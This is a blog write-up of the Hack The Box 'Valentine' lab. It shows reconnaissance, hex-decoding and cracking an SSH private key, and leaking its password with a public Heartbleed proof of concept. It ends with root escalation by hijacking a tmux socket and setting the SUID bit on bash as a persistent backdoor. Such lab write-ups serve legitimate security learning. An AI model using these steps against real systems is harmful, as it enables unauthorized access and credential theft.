---
layout: post
title:  "Valentine Writeup - Hack The Box"
date:   2025-06-09
desc: ""
keywords: "HTB,eWPT,Linux,SSL Heartbleed,Cracking,Tmux Socket File Session,Dirty Cow,Race Condition,Easy"
categories: [HTB]
tags: [HTB,eWPT,Linux,SSL Heartbleed,Cracking,Tmux Socket File Session,Dirty Cow,Race Condition,Easy]
icon: icon-htb
---

> **Disclaimer:** The ***writeups*** that I do on the different machines that I try to vulnerate, cover all the actions that I perform, even those that could be considered wrong, I consider that they are an essential part of the **learning curve** to become a **good professional**. So it can become very extensive content, if you are looking for something more direct, you should look for another site, there are many and of higher quality and different resolutions, moreover, I advocate that it is part of learning to consult different sources, to obtain greater expertise.

<br /><br />
<img src="{{ site.img_path }}/valentine_writeup/Valentine.png" width="100%" style="margin: 0 auto;display: block; max-width: 600px;">
<br /><br />

The next machine in the saga that I'm doing, allowed me to advance a little further on my way to becoming a professional in the field of **Information Security**. The **[Hack The Box](https://www.hackthebox.com){:target="_blank"}**, labs are very challenging if one is not very concentrated and focused on the **Engagement** of the same, the **Valentine** machine was rated as **Easy**, but I really liked it because in its simplicity I could learn and remember some techniques that I did not know. I just spawn the box and start my writeup to consolidate each new knowledge learned.

<br /><br />
<img src="{{ site.img_path }}/valentine_writeup/Valentine_00.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

I send a `ping` trace to verify that I have connectivity with the lab and I use the tool created by the **[hack4u](https://hack4u.io/){:target="_blank"}** community, `whichSystem.py`, to be sure that the **OS** installed on the target machine is **Linux** (thanks to the **TTL** value). Now I can start the **Reconnaissance** phase with `nmap` to get the list of open ports on the machine, I also have the scripts developed in **Lua** to get information about the services and their versions. I find a domain (typical of those used by the **[Hack The Box](https://www.hackthebox.com){:target="_blank"}** platform), and with all the information collected I can investigate the **codename** on the Internet, which can serve as an indicator that containers are being implemented (most likely not in this lab) if I find different ones.

```bash
ping -c 2 10.10.10.79
whichSystem.py 10.10.10.79
sudo nmap -sS --min-rate 5000 -p- --open -vvv -n -Pn 10.10.10.79 -oG allPorts
nmap -sCV -p22,80,443 10.10.10.79 -oN targeted
cat targeted
#    --> OpenSSH 5.9p1 Debian 5ubuntu1.10
#    google.es --> OpenSSH 5.9p1 5ubuntu1.10 launchpad     Precise
#    --> Apache httpd 2.2.22
#    google.es --> Apache httpd 2.2.22 launchpad           Precise
```

<br />
<img src="{{ site.img_path }}/valentine_writeup/Valentine_01.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/valentine_writeup/Valentine_02.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/valentine_writeup/Valentine_03.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

If I use `whatweb` to get information about the technologies implemented in the web services (in both protocols, **HTTP** and **HTTPS**) it leaks some more data but nothing very relevant at the moment. I modify my **hosts** files to add the domain found, maybe now with `whatweb` I can find more data, but I have no luck, from my browser and with the **[Wappalyzer](https://www.wappalyzer.com/){:target="_blank"}** addon I can't find additional information either. If I scan with `openssl` the **HTTPS** service on port **443**, I find neither domains, additional subdomains that can be leaked from the **SSL** certificate. There is an image on the website that may have metadata or hidden content, but even with `exiftool` and `steghide` I can't find anything.

```bash
whatweb http://10.10.10.79 https://10.10.10.79

nvim /etc/hosts
cat /etc/hosts | tail -n 2
ping -c 1 valentine.htb
whatweb http://valentine.htb https://valentine.htb

openssl s_client --connect 10.10.10.79:443

# http://10.10.10.79/
mv /home/al3j0/Downloads/omg.jpg .
exiftool omg.jpg
steghide info omg.jpg
```

<br />
<img src="{{ site.img_path }}/valentine_writeup/Valentine_04.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/valentine_writeup/Valentine_05.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/valentine_writeup/Valentine_06.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/valentine_writeup/Valentine_07.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/valentine_writeup/Valentine_08.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

Thanks to a specific `nmap` script to find hidden web service resources, information from two very interesting folders is leaked (**dev** and **index**). When accessing from the browser I find two files, one is encoded in **hexadecimal** (it has all the appearance) and the other is a list of pending tasks. With the hexadecimal text I can use the `xxd` tool to get the content in clear-text which turns out to be a private key, but it is **encrypted**.

```bash
nmap --script http-enum -p80,443 10.10.10.79 -oN webScan

# http://10.10.10.79/dev/
# http://10.10.10.79/dev/hype_key
# http://10.10.10.79/dev/notes.txt
# Fix decoder/encoder before going live.

echo "oldb0y was here" | xxd
echo "oldb0y was here" | xxd -ps
echo "oldb0y was here" | xxd -ps | xxd -ps -r
cat Data | xxd -ps -r
nvim Data
ncat Data
```

<br />
<img src="{{ site.img_path }}/valentine_writeup/Valentine_09.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/valentine_writeup/Valentine_10.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/valentine_writeup/Valentine_11.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/valentine_writeup/Valentine_12.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

I can try to find the password to decrypt the private key I found, but first I have to get its hash with the `ssh2john` tool and then if I can resort to `john` to look for the password in the **rockyou.txt** dictionary, in case the password is weak. But `john` doesn't find it, so I'm going to have to look for another attack vector to engage the machine.

```bash
cat Data | xxd -ps -r > id_rsa
locate ssh2john
/usr/bin/ssh2john id_rsa > hash
cat hash

john -w=$(locate rockyou.txt)                     # [tab]
john -w=/usr/share/wordlists/rockyou.txt hash
```

<br />
<img src="{{ site.img_path }}/valentine_writeup/Valentine_13.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/valentine_writeup/Valentine_14.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

Since I can't find much on the web service at the moment, I'm going to focus on the **SSH** service and try to find information on possible vulnerabilities that may affect the version installed on the target machine. I'm going back to `nmap` scripts to perform a secure vulnerability scan and it manages to leak me information of **bugs** or **information leakage** that can be transformed into possible attack vectors, such as **Heartbleed** or **SSL POODLE**.

```bash
# Remember: 3) Fix decoder/encoder before going live. ??
# HTTPS --> analyze SSL Certificate ?
locate .nse | xargs grep 'categories' | grep -oP '".*?"' | sort -u
nmap --script "vuln and safe" -p443 10.10.10.79 -oN sslScan
```

<br />
<img src="{{ site.img_path }}/valentine_writeup/Valentine_15.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/valentine_writeup/Valentine_16.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/valentine_writeup/Valentine_17.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

There is a repository on **Github**, which has available a tool specialized in **[testing the SSL protocol](https://github.com/testssl/testssl.sh){:target="_blank"}**. I find a lot of information, but what catches my attention is that the tool shows me on screen that the protocol is not vulnerable to the **Heartbleed** bug, unlike what the `nmap` script indicated.

> **[testssl.sh](https://github.com/testssl/testssl.sh){:target="_blank"}** is a free command line tool which checks a server's service on any port for the support of **TLS/SSL** ciphers, protocols as well as some cryptographic flaws.

```bash
wget https://raw.githubusercontent.com/testssl/testssl.sh/refs/heads/3.2/testssl.sh
bash ./testssl.sh
bash ./testssl.sh https://10.10.10.79
# yes yes yes

# Testing vulnerabilities
# Heartbleed (CVE-2014-0160)                not vulnerable (OK), timed out      ???
# CCS (CVE-2014-0224)                       likely VULNERABLE (NOT ok), suspicious "bad_record_mac" (14)
```

<br />
<img src="{{ site.img_path }}/valentine_writeup/Valentine_18.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/valentine_writeup/Valentine_19.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/valentine_writeup/Valentine_20.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

I'm going to follow my instinct and continue exploring the possibility of exploiting the **[Heartbleed bug](https://nvd.nist.gov/vuln/detail/cve-2014-0160){:target="_blank"}** vulnerability, so I'm going to clone the **[sensepost Github](https://github.com/sensepost/heartbleed-poc){:target="_blank"}** repository to use the **PoC** `heartbleed-poc.py` and try to leak sensitive information in the communication with the server. After several attempts I succeed in capturing a packet, which has an encoded string, most probably in **Base 64** (the format indicates so). If I decode the `base64` string and use it as a dictionary with `john`, it tells me that it is the password of the private key.

> The **TLS** and **DTLS** implementations in OpenSSL 1.0.1 before 1.0.1g do **not properly handle Heartbeat Extension packets**, which allows remote attackers to obtain sensitive information from process memory via crafted packets that trigger a buffer over-read, as demonstrated by reading private keys, related to d1_both.c and t1_lib.c, aka the **Heartbleed** bug.

```bash
wget https://raw.githubusercontent.com/sensepost/heartbleed-poc/refs/heads/master/heartbleed-poc.py
python3 heartbleed-poc.py
python2 heartbleed-poc.py
# -p PORT, --port=PORT  TCP port to test (default: 443)
python2 heartbleed-poc.py 10.10.10.79 -p 443
# Try harder!!
python2 heartbleed-poc.py 10.10.10.79 -p 443

echo "aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==" | base64 -d; echo
# heartbleedbelievethehype
echo heartbleedbelievethehype > custom_dictionary
john -w=./custom_dictionary hash
```

<br />
<img src="{{ site.img_path }}/valentine_writeup/Valentine_21.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/valentine_writeup/Valentine_22.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/valentine_writeup/Valentine_23.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/valentine_writeup/Valentine_24.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

Now that I have the password, I give the correct permissions to the private key and try to connect, but I have a new problem, I have **no valid username**. If I try some common usernames I have no luck and there is also a problem with the encryption algorithm used, on my machine I can not connect because it **is deprecated** so I must use the **[parameter indicated to connect using RSA](https://stackoverflow.com/questions/73795935/sign-and-send-pubkey-no-mutual-signature-supported){:target="_blank"}**. Finding the username **stuck me**, until I found a hint that the community gave me, and also **I avoid a brute force attack**. I only had to look for possible candidates in the key password itself, with the last one I was able to connect, access the first flag and perform the first enumeration commands (I confirmed that the codename was **Precise**).

```bash
chmod 600 id_rsa
ls -la ./id_rsa
ssh -i id_rsa root@10.10.10.79
# sign_and_send_pubkey: no mutual signature supported

ssh -i id_rsa root@10.10.10.79 -vv

ssh -o PubkeyAcceptedKeyTypes=ssh-rsa -i id_rsa root@10.10.10.79

ssh -o PubkeyAcceptedKeyTypes=ssh-rsa -i id_rsa heart@10.10.10.79
ssh -o PubkeyAcceptedKeyTypes=ssh-rsa -i id_rsa bleed@10.10.10.79
ssh -o PubkeyAcceptedKeyTypes=ssh-rsa -i id_rsa believe@10.10.10.79
ssh -o PubkeyAcceptedKeyTypes=ssh-rsa -i id_rsa hype@10.10.10.79

whoami
export TERM=xterm
hostname -I
id
groups
uname -a
lsb_release -a
```

<br />
<img src="{{ site.img_path }}/valentine_writeup/Valentine_25.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/valentine_writeup/Valentine_26.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/valentine_writeup/Valentine_27.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/valentine_writeup/Valentine_28.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

After the first few **Enumeration** commands, I find the unintended path to **Escalate privileges** through **Polkit's** `pkexec` tool which may be vulnerable to **[PwnKit](https://github.com/ly4k/PwnKit){:target="_blank"}**, but I'm going to look for the real attack vector. After exploring the file system a bit I find a hidden folder and even more interestingly, a file that turns out to be a socket from a **Tmux** session. I succeed in connecting to the session with `tmux`, and since it belonged to the **root** user I can **[make changes to the system](https://int0x33.medium.com/day-69-hijacking-tmux-sessions-2-priv-esc-f05893c4ded0){:target="_blank"}** that allow me to establish persistence as the user with maximum privileges (set the **SUID** bit of the **Bash** shell). I exit the session and I can execute the command to obtain a shell, and that this one attends to the user owner of the binary (**root**), this way I succeed to **Escalate privileges** and to create **Persistence**. I access the last flag and finish engaging the box.

> **Tmux** is a terminal multiplexer for Unix-like operating systems. It allows multiple terminal sessions to be accessed simultaneously in a single window. It is useful for running more than one command-line program at the same time.

> **Tmux** can be prone to a **local privilege-escalation vulnerability** because it fails to properly drop group permissions obtained through setGID.

```bash
find \-perm -4000 2>/dev/null
# ./usr/bin/pkexec

getcap / -r 2>/dev/null
crontab -l
sudo -l
ls -la
# .devs
cd .devs
ls
# dev_sess
file dev_sess
# dev_sess: socket

tmux -S dev_sess
whoami
chmod u+s /bin/bash
exit
bash -p
```

<br />
<img src="{{ site.img_path }}/valentine_writeup/Valentine_29.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/valentine_writeup/Valentine_30.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/valentine_writeup/Valentine_31.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/valentine_writeup/Valentine_32.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/valentine_writeup/Valentine_33.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/valentine_writeup/Valentine_34.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

> Another box that did not present a great complexity at the beginning but then led me to get stuck due to my lack of ability to think **outside the box**, but with great effort I was able to overcome. Each **[Hack The Box](https://www.hackthebox.com){:target="_blank"}** lab gives me a great knowledge and also makes me see the reality of this **IT** field, not only technical skills are needed but even more important ones like **lateral thinking** must be developed. I kill the box and look for my next challenge.

<br /><br />
<img src="{{ site.img_path }}/valentine_writeup/Valentine_35.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
